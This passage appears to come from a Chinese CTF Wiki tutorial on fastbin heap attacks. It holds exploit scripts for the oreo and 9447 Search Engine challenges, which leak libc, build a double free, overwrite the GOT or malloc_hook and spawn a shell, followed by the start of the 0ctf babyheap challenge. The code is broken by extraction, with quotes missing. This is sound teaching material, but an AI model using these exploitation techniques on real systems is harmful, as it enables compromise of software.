\nELF\n(\n./oreo\n)\n\n\nif\n \nargs\n[\nREMOTE\n]:\n\n    \np\n \n=\n \nremote\n(\nip\n,\n \nport\n)\n\n\nelse\n:\n\n    \np\n \n=\n \nprocess\n(\n./oreo\n)\n\n\nlog\n.\ninfo\n(\nPID: \n \n+\n \nstr\n(\nproc\n.\npidof\n(\np\n)[\n0\n]))\n\n\nlibc\n \n=\n \nELF\n(\n./libc.so.6\n)\n\n\n\n\ndef\n \nadd\n(\ndescrip\n,\n \nname\n):\n\n    \np\n.\nsendline\n(\n1\n)\n\n    \n#p.recvuntil(\nRifle name: \n)\n\n    \np\n.\nsendline\n(\nname\n)\n\n    \n#p.recvuntil(\nRifle description: \n)\n\n    \n#sleep(0.5)\n\n    \np\n.\nsendline\n(\ndescrip\n)\n\n\n\n\ndef\n \nshow_rifle\n():\n\n    \np\n.\nsendline\n(\n2\n)\n\n    \np\n.\nrecvuntil\n(\n===================================\n\\n\n)\n\n\n\n\ndef\n \norder\n():\n\n    \np\n.\nsendline\n(\n3\n)\n\n\n\n\ndef\n \nmessage\n(\nnotice\n):\n\n    \np\n.\nsendline\n(\n4\n)\n\n    \n#p.recvuntil(\nEnter any notice you\nd like to submit with your order: \n)\n\n    \np\n.\nsendline\n(\nnotice\n)\n\n\n\n\ndef\n \nexp\n():\n\n    \nprint\n \nstep 1. leak libc base\n\n    \nname\n \n=\n \n27\n \n*\n \na\n \n+\n \np32\n(\noreo\n.\ngot\n[\nputs\n])\n\n    \nadd\n(\n25\n \n*\n \na\n,\n \nname\n)\n\n    \nshow_rifle\n()\n\n    \np\n.\nrecvuntil\n(\n===================================\n\\n\n)\n\n    \np\n.\nrecvuntil\n(\nDescription: \n)\n\n    \nputs_addr\n \n=\n \nu32\n(\np\n.\nrecvuntil\n(\n\\n\n,\n \ndrop\n=\nTrue\n)[:\n4\n])\n\n    \nlog\n.\nsuccess\n(\nputs addr: \n \n+\n \nhex\n(\nputs_addr\n))\n\n    \nlibc_base\n \n=\n \nputs_addr\n \n-\n \nlibc\n.\nsymbols\n[\nputs\n]\n\n    \nsystem_addr\n \n=\n \nlibc_base\n \n+\n \nlibc\n.\nsymbols\n[\nsystem\n]\n\n    \nbinsh_addr\n \n=\n \nlibc_base\n \n+\n \nnext\n(\nlibc\n.\nsearch\n(\n/bin/sh\n))\n\n\n    \nprint\n \nstep 2. free fake chunk at 0x0804A2A8\n\n\n    \n# now, oifle_cnt=1, we need set it = 0x40\n\n    \noifle\n \n=\n \n1\n\n    \nwhile\n \noifle\n \n \n0x3f\n:\n\n        \n# set next link=NULL\n\n        \nadd\n(\n25\n \n*\n \na\n,\n \na\n \n*\n \n27\n \n+\n \np32\n(\n0\n))\n\n        \noifle\n \n+=\n \n1\n\n    \npayload\n \n=\n \na\n \n*\n \n27\n \n+\n \np32\n(\n0x0804a2a8\n)\n\n    \n# set next link=0x0804A2A8, try to free a fake chunk\n\n    \nadd\n(\n25\n \n*\n \na\n,\n \npayload\n)\n\n    \n# before free, we need to bypass some check\n\n    \n# fake chunk\ns size is 0x40\n\n    \n# 0x20 *\na\n for padding the last fake chunk\n\n    \n# 0x40 for fake chunk\ns next chunk\ns prev_size\n\n    \n# 0x100 for fake chunk\ns next chunk\ns size\n\n    \n# set fake iofle\n next to be NULL\n\n    \npayload\n \n=\n \n0x20\n \n*\n \n\\x00\n \n+\n \np32\n(\n0x40\n)\n \n+\n \np32\n(\n0x100\n)\n\n    \npayload\n \n=\n \npayload\n.\nljust\n(\n52\n,\n \nb\n)\n\n    \npayload\n \n+=\n \np32\n(\n0\n)\n\n    \npayload\n \n=\n \npayload\n.\nljust\n(\n128\n,\n \nc\n)\n\n    \nmessage\n(\npayload\n)\n\n    \n# fastbin 0x40: 0x0804A2A0-\nsome where heap-\nNULL\n\n    \norder\n()\n\n    \np\n.\nrecvuntil\n(\nOkay order submitted!\n\\n\n)\n\n\n    \nprint\n \nstep 3. get shell\n\n    \n# modify free@got to system addr\n\n    \npayload\n \n=\n \np32\n(\noreo\n.\ngot\n[\nstrlen\n])\n.\nljust\n(\n20\n,\n \na\n)\n\n    \nadd\n(\npayload\n,\n \nb\n \n*\n \n20\n)\n\n    \nlog\n.\nsuccess\n(\nsystem addr: \n \n+\n \nhex\n(\nsystem_addr\n))\n\n    \n#gdb.attach(p)\n\n    \nmessage\n(\np32\n(\nsystem_addr\n)\n \n+\n \n;/bin/sh\n\\x00\n)\n\n\n    \np\n.\ninteractive\n()\n\n\n\n\nif\n \n__name__\n \n==\n \n__main__\n:\n\n    \nexp\n()\n\n\n\n\n\n\u5f53\u7136\uff0c\u8be5\u9898\u76ee\u4e5f\u53ef\u4ee5\u4f7f\u7528 \nfast bin attack\n \u4e2d\u7684\u5176\u5b83\u6280\u672f\u6765\u5b9e\u73b0\uff0c\u53ef\u53c2\u8003\u53c2\u8003\u6587\u732e\u4e2d\u7684\u94fe\u63a5\u3002\n\n\n2015 9447 CTF : Search Engine\n\n\n\u57fa\u672c\u4fe1\u606f\n\n\n\u279c  2015_9447ctf_search-engine git:\n(\nmaster\n)\n file search\nsearch: ELF \n64\n-bit LSB executable, x86-64, version \n1\n \n(\nSYSV\n)\n, dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, \nfor\n GNU/Linux \n2\n.6.24, BuildID\n[\nsha1\n]=\n4f5b70085d957097e91f940f98c0d4cc6fb3343f, stripped\n\u279c  2015_9447ctf_search-engine git:\n(\nmaster\n)\n checksec search   \n\n[\n*\n]\n \n/mnt/hgfs/Hack/ctf/ctf-wiki/pwn/heap/example/fastbin_attack/2015_9447ctf_search-engine/search\n\n    Arch:     amd64-64-little\n    RELRO:    Partial RELRO\n    Stack:    Canary found\n    NX:       NX enabled\n    PIE:      No PIE \n(\n0x400000\n)\n\n    FORTIFY:  Enabled\n\n\n\n\n\u57fa\u672c\u529f\u80fd\n\n\n\u7a0b\u5e8f\u7684\u57fa\u672c\u529f\u80fd\u662f\n\n\n\n\n\u7d22\u5f15\u4e00\u4e2a\u53e5\u5b50\n\n\n\u5927\u5c0fv0\uff0c(unsigned int)(v0 - 1) \n 0xFFFD\n\n\n\u8bfb\u53d6\u7684\u5b57\u7b26\u4e32\u957f\u5ea6\u5fc5\u987b\u548c\u7ed9\u5b9a\u7684\u5927\u5c0f\u76f8\u7b49\n\n\n\u6bcf\u6b21\u7d22\u5f15\u7684\u53e5\u5b50\u90fd\u662f\u76f4\u63a5\u5728\u76f4\u63a5\u5efa\u7acb\u5728\u524d\u9762\u7684\u53e5\u5b50\u4e0a\u7684\u3002\n\n\n\u5728\u4e00\u4e2a\u53e5\u5b50\u4e2d\u641c\u7d22\u5355\u8bcd\n\n\n\u5927\u5c0fv0\uff0c(unsigned int)(v0 - 1) \n 0xFFFD\n\n\n\u8bfb\u53d6\u6307\u5b9a\u957f\u5ea6\u5b57\u7b26\u4e32\n\n\n\u5982\u679c\u6709\u56de\u8f66\u6807\u8bb0\n\n\n\u5728\u6307\u5b9a\u957f\u5ea6\u5185\u6ca1\u6709\u9047\u5230\u56de\u8f66\uff0c\u5219\u8bfb\u5b8c\u6ca1\u6709\u8bbe\u7f6eNULL\u6807\u8bb0\n\n\n\u5728\u6307\u5b9a\u957f\u5ea6\u5185\u9047\u5230\u56de\u8f66\uff0c\u5c31\u622a\u65ad\u8fd4\u56de\u3002\n\n\n\n\n\n\n\u6ca1\u6709\u56de\u8f66\u6807\u8bb0\n\n\n\u8bfb\u591f\u6307\u5b9a\u957f\u5ea6\uff0c\u6ca1\u6709NULL\u6807\u8bb0\u7ed3\u5c3e\u3002\n\n\n\n\n\n\n\n\n\u8bcd\u8bed\u7ed3\u6784\u4f53\n\n\n\u901a\u8fc7\u5206\u6790\u7d22\u5f15\u53e5\u5b50\u7684\u8fc7\u7a0b\uff0c\u6211\u4eec\u53ef\u4ee5\u5f97\u5230\u8bcd\u8bed\u7684\u7ed3\u6784\u5982\u4e0b\n\n\n00000000 word_struct     struc ; (sizeof=0x28, mappedto_6)\n00000000 content         dq ?\n00000008 size            dd ?\n0000000C padding1        dd ?\n00000010 sentence_ptr    dq ?                    ; offset\n00000018 len             dd ?\n0000001C padding2        dd ?\n00000020 next            dq ?                    ; offset\n00000028 word_struct     ends\n\n\n\n\n\u5806\u5185\u5b58\u76f8\u5173\u64cd\u4f5c\n\n\n\u5206\u914d\n\n\n\n\nmalloc 40 \u5b57\u8282\u4e3a\u4e00\u4e2aword\u7ed3\u6784\u4f53\n\n\n\u4e3a\u53e5\u5b50\u6216\u8005\u5355\u8bcd malloc \u6307\u5b9a\u5927\u5c0f\u3002\n\n\n\n\n\u91ca\u653e\n\n\n\n\n\u91ca\u653e\u5220\u9664\u7684\u53e5\u5b50\n\n\n\u91ca\u653e\u5220\u9664\u53e5\u5b50\u6240\u641c\u7d22\u7684\u4e34\u65f6\u5355\u8bcd\n\n\n\u91ca\u653e\u7d22\u5f15\u53e5\u5b50\u65f6\u672a\u4f7f\u7528\u7684\u5355\u8bcd\u7ed3\u6784\n\n\n\n\n\u6f0f\u6d1e\n\n\n\u7d22\u5f15\u53e5\u5b50\u8bfb\u53d6\u5b57\u7b26\u4e32\u65f6\u65e0NULL\u7ed3\u5c3e\n\n\n\u5728\u7d22\u5f15\u53e5\u5b50\u65f6 flag_enter \u6c38\u8fdc\u4e3a 0\uff0c\u6240\u4ee5\u8bfb\u53d6\u53e5\u5b50\u65f6\u6700\u540e\u6ca1\u6709 NULL \u7ed3\u5c3e\u3002\n\n\n    \n_flag_enter\n \n=\n \nflag_enter\n;\n\n    \nv4\n \n=\n \n0\n;\n\n    \nwhile\n \n(\n \n1\n \n)\n\n    \n{\n\n      \nv5\n \n=\n \ns\n[\nv4\n];\n\n      \nv6\n \n=\n \nfread\n(\ns\n[\nv4\n],\n \n1uLL\n,\n \n1uLL\n,\n \nstdin\n);\n\n      \nif\n \n(\n \nv6\n \n=\n \n0\n \n)\n\n        \nbreak\n;\n\n      \nif\n \n(\n \n*\nv5\n \n==\n \n\\n\n \n \n_flag_enter\n \n)\n\n      \n{\n\n        \nif\n \n(\n \nv4\n \n)\n\n        \n{\n\n          \n*\nv5\n \n=\n \n0\n;\n\n          \nreturn\n;\n\n        \n}\n\n        \nv4\n \n=\n \nv6\n \n-\n \n1\n;\n\n        \nif\n \n(\n \nlen\n \n=\n \nv6\n \n-\n \n1\n \n)\n\n          \nbreak\n;\n\n      \n}\n\n      \nelse\n\n      \n{\n\n        \nv4\n \n+=\n \nv6\n;\n\n        \nif\n \n(\n \nlen\n \n=\n \nv4\n \n)\n\n          \nbreak\n;\n\n      \n}\n\n    \n}\n\n\n\n\n\n\u8bfb\u53d6\u9009\u62e9\u64cd\u4f5c\u6570\n\n\n__int64\n \nread_num\n()\n\n\n{\n\n  \n__int64\n \nresult\n;\n \n// rax\n\n  \nchar\n \n*\nendptr\n;\n \n// [rsp+8h] [rbp-50h]\n\n  \nchar\n \nnptr\n;\n \n// [rsp+10h] [rbp-48h]\n\n  \nunsigned\n \n__int64\n \nv3\n;\n \n// [rsp+48h] [rbp-10h]\n\n\n  \nv3\n \n=\n \n__readfsqword\n(\n0x28u\n);\n\n  \nread_str\n(\nnptr\n,\n \n48\n,\n \n1\n);\n\n  \nresult\n \n=\n \nstrtol\n(\nnptr\n,\n \nendptr\n,\n \n0\n);\n\n  \nif\n \n(\n \nendptr\n \n==\n \nnptr\n \n)\n\n  \n{\n\n    \n__printf_chk\n(\n1LL\n,\n \n%s is not a valid number\n\\n\n,\n \nnptr\n);\n\n    \nresult\n \n=\n \nread_num\n();\n\n  \n}\n\n  \n__readfsqword\n(\n0x28u\n);\n\n  \nreturn\n \nresult\n;\n\n\n}\n\n\n\n\n\n\u56e0\u4e3a read_str \u4e0d\u8bbe\u7f6eNULL \uff0c\u56e0\u6b64\uff0c\u5982\u679c nptr \u8bfb\u53d6\u7684\u4e0d\u5408\u6cd5\u7684\u8bdd\uff0c\u5c31\u6709\u53ef\u80fd\u4f1a leak \u51fa\u6808\u4e0a\u7684\u5185\u5bb9\u3002\n\n\n\u7d22\u5f15\u53e5\u5b50\u91ca\u653e\u672a\u7f6eNULL\n\n\n  \nelse\n\n  \n{\n\n    \nfree\n(\nv6\n);\n\n  \n}\n\n\n\n\n\n\u641c\u7d22\u8bcd\u8bed\u4e2d\u5220\u9664\u8bcd\u8bed\u65f6\uff0c\u5bf9\u5e94\u53e5\u5b50\u6307\u9488\u53ea\u662f\u91ca\u653e\uff0c\u5e76\u6ca1\u6709\u8bbe\u7f6e\u4e3aNULL\n\n\n  \nfor\n \n(\n \ni\n \n=\n \nhead\n;\n \ni\n;\n \ni\n \n=\n \ni\n-\nnext\n \n)\n\n  \n{\n\n    \nif\n \n(\n \n*\ni\n-\nsentence_ptr\n \n)\n\n    \n{\n\n      \nif\n \n(\n \nLODWORD\n(\ni\n-\nsize\n)\n \n==\n \nv0\n \n \n!\nmemcmp\n((\nconst\n \nvoid\n \n*\n)\ni\n-\ncontent\n,\n \nv1\n,\n \nv0\n)\n \n)\n\n      \n{\n\n        \n__printf_chk\n(\n1LL\n,\n \nFound %d: \n,\n \nLODWORD\n(\ni\n-\nlen\n));\n\n        \nfwrite\n(\ni\n-\nsentence_ptr\n,\n \n1uLL\n,\n \nSLODWORD\n(\ni\n-\nlen\n),\n \nstdout\n);\n\n        \nputchar\n(\n\\n\n);\n\n        \nputs\n(\nDelete this sentence (y/n)?\n);\n\n        \nread_str\n(\nchoice\n,\n \n2\n,\n \n1\n);\n\n        \nif\n \n(\n \nchoice\n \n==\n \ny\n \n)\n\n        \n{\n\n          \nmemset\n(\ni\n-\nsentence_ptr\n,\n \n0\n,\n \nSLODWORD\n(\ni\n-\nlen\n));\n\n          \nfree\n(\ni\n-\nsentence_ptr\n);\n\n          \nputs\n(\nDeleted!\n);\n\n        \n}\n\n      \n}\n\n    \n}\n\n  \n}\n\n  \nfree\n(\nv1\n);\n\n\n\n\n\n\u53ef\u4ee5\u770b\u51fa\uff0c\u5728\u6bcf\u6b21\u91ca\u653e i-\nsentence_ptr \u4e4b\u524d\uff0c\u8fd9\u4e2a\u53e5\u5b50\u7684\u5185\u5bb9\u5c31\u4f1a\u5168\u90e8\u88ab\u8bbe\u7f6e\u4e3a \n\\x00\n \uff0c\u7531\u4e8e\u5355\u8bcd\u7ed3\u6784\u4f53\u4e2d\u5b58\u50a8\u7684\u5355\u8bcd\u53ea\u662f\u53e5\u5b50\u7684\u4e00\u4e2a\u6307\u9488\uff0c\u6240\u4ee5\u5355\u8bcd\u4e5f\u4f1a\u88ab\u7f6e\u4e3a \n\\x00\n \u3002\u8be5\u53e5\u5b50\u5bf9\u5e94\u7684\u90a3\u4e9b\u5355\u8bcd\u4ecd\u7136\u662f\u5b58\u5728\u4e8e\u94fe\u8868\u4e2d\u7684\uff0c\u5e76\u6ca1\u6709\u88ab\u5220\u9664\uff0c\u56e0\u6b64\u6bcf\u6b21\u641c\u7d22\u5355\u8bcd\u7684\u65f6\u5019\uff0c\u4ecd\u7136\u4f1a\u5224\u65ad\u3002\u770b\u8d77\u6765\u7531\u4e8e\u53e5\u5b50\u5185\u5bb9\u88ab\u7f6e\u4e3a \n\\x00\n \u53ef\u4ee5\u9632\u6b62\u901a\u8fc7 \n*i-\nsentence_ptr\n \u9a8c\u8bc1\u3002\u7136\u800c\uff0c\u7531\u4e8e chunk \u88ab\u91ca\u653e\u540e\u4f1a\u88ab\u653e\u5230 bin \u4e2d\uff0c\u5f53 chunk \u4e0d\u662f fastbin \u6216\u8005 chunk \u88ab\u91cd\u65b0\u5206\u914d\u51fa\u53bb\u4f7f\u7528\u7684\u65f6\u5019\uff0c\u4e5f\u5c31\u6709\u53ef\u80fd\u4f1a\u4ea7\u751f double free \u7684\u60c5\u51b5\u3002\u6b64\u5916\uff0c\u5f53\u53e5\u5b50\u88ab \nmemset\n \u7684\u65f6\u5019\uff0c\u5355\u8bcd\u867d\u7136\u90fd\u53d8\u4e3a\u4e86 \n\\x00\n \uff0c\u4f46\u662f\u6211\u4eec\u4ecd\u7136\u53ef\u4ee5\u901a\u8fc7\u4e24\u4e2a \n\\x00\n \u7684\u6bd4\u8f83\u6765\u7ed5\u8fc7 \nmemcmp\n \u7684\u68c0\u6d4b\u3002\n\n\n\u5229\u7528\n\n\n\u5229\u7528\u601d\u8def\n\n\n\u57fa\u672c\u5229\u7528\u601d\u8def\u5982\u4e0b\n\n\n\n\n\u5229\u7528 unsorted bin \u5730\u5740\u6cc4\u6f0f libc \u57fa\u5730\u5740\n\n\n\u5229\u7528 double free \u6784\u9020 fastbin \u5faa\u73af\u94fe\u8868\n\n\n\u5206\u914d chunk \u5230 malloc_hook \u9644\u8fd1\uff0c\u4fee\u6539malloc_hook \u4e3a one_gadget\n\n\n\n\n\u6cc4\u6f0f libc \u5730\u5740\n\n\n\u8fd9\u91cc\u6211\u4eec\u5206\u914d\u4e00\u4e2a small bin \u5927\u5c0f\u7684 chunk \uff0c\u5f53\u5b83\u88ab\u91ca\u653e\u540e\uff0c\u5c31\u4f1a\u653e\u5165\u5230 unsorted bin \u4e2d\u3002\u56e0\u800c\uff0c\u53ea\u8981 \nunsorted bin\n \u7684\u5730\u5740\u7684\u8d77\u59cb\u5b57\u8282\u4e0d\u662f \n\\x00\n \u4fbf\u53ef\u4ee5\u901a\u8fc7\u9a8c\u8bc1\u3002\u540c\u65f6\uff0c\u6211\u4eec\u53ef\u4ee5\u6784\u9020 \n\\x00\n \u6765\u8fdb\u884c\u6bd4\u8f83\uff0c\u4ece\u800c\u901a\u8fc7\u9a8c\u8bc1\u3002\u5177\u4f53\u5982\u4e0b\n\n\ndef\n \nleak_libc\n():\n\n    \nsmallbin_sentence\n \n=\n \ns\n \n*\n \n0x85\n \n+\n \n m \n\n    \nindex_sentence\n(\nsmallbin_sentence\n)\n\n    \nsearch_word\n(\nm\n)\n\n    \np\n.\nrecvuntil\n(\nDelete this sentence (y/n)?\n\\n\n)\n\n    \np\n.\nsendline\n(\ny\n)\n\n    \nsearch_word\n(\n\\x00\n)\n\n    \np\n.\nrecvuntil\n(\nFound \n \n+\n \nstr\n(\nlen\n(\nsmallbin_sentence\n))\n \n+\n \n: \n)\n\n    \nunsortedbin_addr\n \n=\n \nu64\n(\np\n.\nrecv\n(\n8\n))\n\n    \np\n.\nrecvuntil\n(\nDelete this sentence (y/n)?\n\\n\n)\n\n    \np\n.\nsendline\n(\nn\n)\n\n    \nreturn\n \nunsortedbin_addr\n\n\n\n\n\n\u6784\u9020 fastbin \u5faa\u73af\u94fe\u8868\n\n\n\u7531\u4e8e\u6211\u4eec\u6700\u540e\u5e0c\u671b\u5728 malloc_hook \u5904\u5206\u914d chunk\uff0c\u800c\u4e00\u822c\u5206\u914d malloc_hook \u9644\u8fd1\u7684 chunk \u4e00\u822c\u5927\u5c0f\u90fd\u662f0x7f\u3002\u5373\uff0c\u6211\u4eec\u6240\u9700\u8981\u8bbe\u7f6e\u7684\u8bbe\u7f6e\u7684 fast bin \u7684\u6570\u636e\u5b57\u8282\u90e8\u5206\u7684\u5927\u5c0f\u4e3a 0x60\u3002\u8fd9\u91cc\u6211\u4eec\u6309\u7167\u5982\u4e0b\u65b9\u5f0f\u6784\u9020\n\n\n\n\n\u5206\u522b\u7d22\u5f15\u53e5\u5b50a\uff0c\u7d22\u5f15\u53e5\u5b50b\uff0c\u7d22\u5f15\u53e5\u5b50c\uff0c\u5219\u6b64\u65f6\u5355\u8bcd\u94fe\u8868\u4e2d\u7d22\u5f15\u7684\u53e5\u5b50\u7684\u76f8\u5bf9\u987a\u5e8f\u4e3ac-\nb-\na\u3002\u5047\u8bbe\u53e5\u5b50 a \u4e3a'a' * 0x5d+' d '\uff0c\u53e5\u5b50 b \u4e3a 'b' * 0x5d+' d '\uff0c\u53e5\u5b50c\u7c7b\u4f3c\u3002\n\n\n\u7d22\u5f15\u5355\u8bcdd\uff0c\u4e09\u4e2a\u5747\u5220\u9664\uff0c\u5219\u6b64\u65f6 fastbin \u4e2d\u7684\u94fe\u8868\u60c5\u51b5\u4e3a a-\nb-\nc-\nNULL\uff0c\u8fd9\u662f\u56e0\u4e3a\u9996\u5148\u91ca\u653e\u7684\u662f\u53e5\u5b50c\uff0c\u6700\u540e\u91ca\u653e\u7684\u662f\u53e5\u5b50 a \u3002\u8fd9\u65f6\uff0c\u641c\u7d22\u5355\u8bcd\u65f6\n*i-\nsentence_ptr\n \u5bf9\u4e8ea, b \u6765\u8bf4\u90fd\u662f\u53ef\u4ee5\u7ed5\u8fc7\u7684\u3002\n\n\n\u6211\u4eec\u6b64\u65f6\u518d\u6b21\u5220\u9664\u641c\u7d22\u5355\u8bcd \n\\x00\n\u3002\u9996\u5148\u904d\u5386\u7684\u662f c\uff0c\u4f46\u662f c \u7684\u9a8c\u8bc1\u4e0d\u901a\u8fc7\uff1b\u5176\u6b21\u904d\u5386\u7684\u662fb\uff0c\u9a8c\u8bc1\u901a\u8fc7\uff0c\u6211\u4eec\u5c06\u5176\u91ca\u653e\uff1b\u5176\u6b21\u904d\u5386\u7684\u662fa\uff0c\u9a8c\u8bc1\u901a\u8fc7\uff0c\u4f46\u662f\u6211\u4eec\u4e0d\u5220\u9664\u3002\u5219\u6b64\u65f6 fastbin \u7684\u60c5\u51b5\u4e3a b-\na-\nb-\na-\n...\u3002\u5373\u5df2\u7ecf\u6784\u6210\u4e86double free b\u7684\u60c5\u51b5\u3002\u7531\u4e8e\u6211\u4eec\u5148\u524d\u4e3a\u4e86 leak libc \u8fd8\u5efa\u7acb\u4e00\u4e2a\u53e5\u5b50\uff0c\u6240\u4ee5\u8fd8\u6709\u4e00\u4e2a\u5355\u8bcd\u53ef\u4ee5\u6bd4\u8f83\uff0c\u8fd9\u91cc\u6211\u4eec\u4e5f\u4e0d\u5220\u9664\u3002\n\n\n\n\n\u5177\u4f53\u4ee3\u7801\u5982\u4e0b\n\n\n    \n# 2. create cycle fastbin 0x70 size\n\n    \nindex_sentence\n(\na\n \n*\n \n0x5d\n \n+\n \n d \n)\n  \n#a\n\n    \nindex_sentence\n(\nb\n \n*\n \n0x5d\n \n+\n \n d \n)\n  \n#b\n\n    \nindex_sentence\n(\nc\n \n*\n \n0x5d\n \n+\n \n d \n)\n  \n#c\n\n\n    \n# a-\nb-\nc-\nNULL\n\n    \nsearch_word\n(\nd\n)\n\n    \np\n.\nrecvuntil\n(\nDelete this sentence (y/n)?\n\\n\n)\n\n    \np\n.\nsendline\n(\ny\n)\n\n    \np\n.\nrecvuntil\n(\nDelete this sentence (y/n)?\n\\n\n)\n\n    \np\n.\nsendline\n(\ny\n)\n\n    \np\n.\nrecvuntil\n(\nDelete this sentence (y/n)?\n\\n\n)\n\n    \np\n.\nsendline\n(\ny\n)\n\n\n    \n# b-\na-\nb-\na-\n...\n\n    \nsearch_word\n(\n\\x00\n)\n\n    \np\n.\nrecvuntil\n(\nDelete this sentence (y/n)?\n\\n\n)\n\n    \np\n.\nsendline\n(\ny\n)\n\n    \np\n.\nrecvuntil\n(\nDelete this sentence (y/n)?\n\\n\n)\n\n    \np\n.\nsendline\n(\nn\n)\n\n    \np\n.\nrecvuntil\n(\nDelete this sentence (y/n)?\n\\n\n)\n\n    \np\n.\nsendline\n(\nn\n)\n\n\n\n\n\n\u6548\u679c\u5982\u4e0b\n\n\npwndbg\n fastbins \nfastbins\n0x20: 0x0\n0x30: 0x1d19320 \u25c2\u2014 0x0\n0x40: 0x0\n0x50: 0x0\n0x60: 0x0\n0x70: 0x1d191b0 \u2014\u25b8 0x1d19010 \u2014\u25b8 0x1d191b0 \u25c2\u2014 0x1d19010\n0x80: 0x0\n\n\n\n\n\u5206\u914d malloc_hook \u9644\u8fd1chunk\n\n\n\u6b64\u65f6\uff0cfastbin \u7684\u94fe\u8868\u4e3a b-\na-\nb-\na-\n\u2026\uff0c\u5219\u6211\u4eec\u53ef\u4ee5\u5728\u7533\u8bf7\u7b2c\u4e00\u4e2a\u76f8\u540c\u5927\u5c0f\u7684 chunk \u65f6\uff0c\u8bbe\u7f6e b \u7684 fd \u4e3a malloc_hook \u9644\u8fd1\u5904\u7684 chunk \n0x7fd798586aed\n\uff08\u8fd9\u91cc\u662f\u4e3e\u4e00\u4e2a\u4f8b\u5b50\uff0c\u4ee3\u7801\u4e2d\u9700\u4f7f\u7528\u76f8\u5bf9\u5730\u5740\uff09\u3002\n\n\npwndbg\n print \n(\nvoid*\n)\nmain_arena \n\n$1\n \n=\n \n(\nvoid *\n)\n 0x7fd798586b20 \nmain_arena\n\npwndbg\n x/8gx 0x7fd798586b20-16\n0x7fd798586b10 \n__malloc_hook\n: 0x0000000000000000  0x0000000000000000\n0x7fd798586b20 \nmain_arena\n:    0x0000000000000000  0x0000000000bce130\n0x7fd798586b30 \nmain_arena+16\n: 0x0000000000000000  0x0000000000000000\n0x7fd798586b40 \nmain_arena+32\n: 0x0000000000000000  0x0000000000000000\npwndbg\n find_fake_fast 0x7fd798586b10 0x7f\nFAKE CHUNKS\n0x7fd798586aed PREV_INUSE IS_MMAPED NON_MAIN_ARENA \n{\n\n  \nprev_size\n \n=\n \n15535264025435701248\n, \n  \nsize\n \n=\n \n127\n, \n  \nfd\n \n=\n 0xd798247e20000000, \n  \nbk\n \n=\n 0xd798247a0000007f, \n  \nfd_nextsize\n \n=\n 0x7f, \n  \nbk_nextsize\n \n=\n 0x0\n\n}\n\npwndbg\n print /x 0x7fd798586b10-0x7fd798586aed\n\n$2\n \n=\n 0x23\npwndbg\n print /x 0x7fd798586b20-0x7fd798586aed\n\n$3\n \n=\n 0x33\n\n\n\n\n\u90a3\u4e48\u5f53\u518d\u6b21\u5206\u914d b \u7684\u65f6\u5019\uff0c\u7531\u4e8e\u6b64\u65f6 b \u7684 fd \u5df2\u7ecf\u88ab\u6211\u4eec\u4fee\u6539\u4e3a\u4e86malloc_hook\u9644\u8fd1\u7684\u5730\u5740\uff0c\u6240\u4ee5\u8fd9\u65f6\u5019\u6211\u4eec\u518d\u6b21\u5206\u914d\u4e00\u4e2a chunk\uff0c\u5c31\u4f1a\u6307\u5411 \n0x7fd798586aed\n\u3002 \u6b64\u540e\u4fbf\u53ea\u9700\u8981\u5c06 malloc_hook \u4fee\u6539\u4e3a one_gadget \u5730\u5740\u5c31\u53ef\u4ee5\u62ff\u5230 shell \u4e86\u3002\n\n\n    \n# 3. fastbin attack to malloc_hook nearby chunk\n\n    \nfake_chunk_addr\n \n=\n \nmain_arena_addr\n \n-\n \n0x33\n\n    \nfake_chunk\n \n=\n \np64\n(\nfake_chunk_addr\n)\n.\nljust\n(\n0x60\n,\n \nf\n)\n\n\n    \nindex_sentence\n(\nfake_chunk\n)\n\n\n    \nindex_sentence\n(\na\n \n*\n \n0x60\n)\n\n\n    \nindex_sentence\n(\nb\n \n*\n \n0x60\n)\n\n\n    \none_gadget_addr\n \n=\n \nlibc_base\n \n+\n \n0xf02a4\n\n    \npayload\n \n=\n \na\n \n*\n \n0x13\n \n+\n \np64\n(\none_gadget_addr\n)\n\n    \npayload\n \n=\n \npayload\n.\nljust\n(\n0x60\n,\n \nf\n)\n\n    \n#gdb.attach(p)\n\n    \nindex_sentence\n(\npayload\n)\n\n    \np\n.\ninteractive\n()\n\n\n\n\n\n\u8fd9\u91cc\u53ef\u80fd\u9700\u8981\u591a\u9009\u62e9\u51e0\u4e2a one_gadget \u5730\u5740\uff0c\u56e0\u4e3a one_gadget \u6210\u529f\u662f\u6709\u6761\u4ef6\u7684\u3002\n\n\nshell\n\n\n\u279c  2015_9447ctf_search-engine git:\n(\nmaster\n)\n python exp.py\n\n[\n*\n]\n \n/mnt/hgfs/Hack/ctf/ctf-wiki/pwn/heap/example/fastbin_attack/2015_9447ctf_search-engine/search\n\n    Arch:     amd64-64-little\n    RELRO:    Partial RELRO\n    Stack:    Canary found\n    NX:       NX enabled\n    PIE:      No PIE \n(\n0x400000\n)\n\n    FORTIFY:  Enabled\n\n[\n+\n]\n Starting \nlocal\n process \n./search\n: pid \n31158\n\n\n[\n*\n]\n PID: \n31158\n\n\n[\n+\n]\n unsortedbin addr: 0x7f802e73bb78\n\n[\n+\n]\n libc base addr: 0x7f802e377000\n\n[\n*\n]\n Switching to interactive mode\nEnter the sentence:\n$ ls\nexp.py       search      search.id1  search.nam\nlibc.so.6  search.id0  search.id2  search.til\n\n\n\n\n\u5f53\u7136\uff0c\u8fd9\u91cc\u8fd8\u6709\u4e00\u79cd\n\u65b9\u6cd5\n\uff0c\u5c06 chunk \u5206\u914d\u5230\u6808\u4e0a\u3002\n\n\n2017 0ctf babyheap\n\n\n\u57fa\u672c\u4fe1\u606f\n\n\n\u279c  2017_0ctf_babyheap git:\n(\nmaster\n)\n file babyheap                            \nbabyheap: ELF \n64\n-bit LSB shared object, x86-64, version \n1\n \n(\nSYSV\n)\n, dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, \nfor\n GNU/Linux \n2\n.6.32, BuildID\n[\nsha1\n]=\n9e5bfa980355d6158a76acacb7bda01f4e3fc1c2, stripped\n\u279c  2017_0ctf_babyheap git:\n(\nmaster\n)\n checksec babyheap   \n\n[\n*\n]\n \n/mnt/hgfs/Hack/ctf/ctf-wiki/pwn/heap/example/fastbin_attack/2017_0ctf_babyheap/babyheap\n\n    Arch:     amd64-64-little\n    RELRO:    Full RELRO\n    Stack:    Canary found\n    NX:       NX enabled\n    PIE:      PIE 